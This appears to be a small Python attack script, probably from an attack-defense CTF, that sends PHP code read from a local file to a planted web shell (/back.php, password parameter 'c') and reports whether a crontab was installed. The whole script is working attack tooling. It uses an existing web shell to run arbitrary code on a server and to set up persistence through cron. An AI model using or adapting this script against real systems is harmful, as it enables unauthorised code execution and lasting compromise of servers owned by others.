import requests
def make_crontab():
    shell ="/back.php"  
    passwd = "c"
    filename = "exp.txt"
    f= open(filename,"r")
    php = f.read() 
    data = {passwd:php}
    url1 = "http://127.0.0.1" + shell
    print(url1)
    print(data)
    try:
        attack = requests.post(url=url1,data=data,timeout=1)
        if(len(attack.content)>1):
            print(attack.content)
            print(url1+"-----------------make crontab success!")
    except:
    	print(url1+"-----error")
make_crontab()
